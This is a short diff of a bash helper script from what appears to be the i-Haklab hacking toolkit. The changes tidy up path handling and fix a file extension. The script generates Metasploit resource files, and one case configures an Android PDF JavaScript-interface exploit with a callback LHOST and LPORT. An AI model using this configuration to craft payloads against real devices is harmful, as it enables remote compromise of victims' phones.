@@ -13,10 +13,8 @@ else
 	user=exec
 fi
 apk=$4
-if [ ! -d ~/.local/etc/i-Haklab/rcFiles ]; then
-	mkdir -p ~/.local/etc/i-Haklab/rcFiles
-fi
-rcFiles="~/.local/etc/i-Haklab/rcFiles"
+[[ -d $HOME/.local/etc/i-Haklab/rcFiles ]] || mkdir -p $HOME/.local/etc/i-Haklab/rcFiles
+rcFiles="$HOME/.local/etc/i-Haklab/rcFiles"
 
 handlerRC(){
 cat <<- CONF > $rcFiles/$opts.rc
@@ -56,7 +54,7 @@ case $opts in
 		handlerRC
 		;;
 	paypdf)
-		cat <<- CONF > $rcFiles/$opts.rf
+		cat <<- CONF > $rcFiles/$opts.rc
 		use exploit/android/fileformat/adobe_reader_pdf_js_interface
 		set LHOST $HOST
 		set LPORT $PORT
@@ -70,8 +68,10 @@ case $opts in
 		$user msfconsole -q -r $rcFiles/$opts.rc
 		;;
 	shodan)
-		if [ ! -e $MSFPATH/documentation/api/apikey ]; then
-			touch $MSFPATH/documentation/api/apikey
+		if [[ ! -e $MSFPATH/documentation/api/apikey ]]
+			then
+				mkdir -p $MSFPATH/documentation/api
+				touch $MSFPATH/documentation/api/apikey
 		fi
 		APIKEYFILE=$MSFPATH/documentation/api/apikey
 		if [[ ! $(cat $APIKEYFILE) ]];then
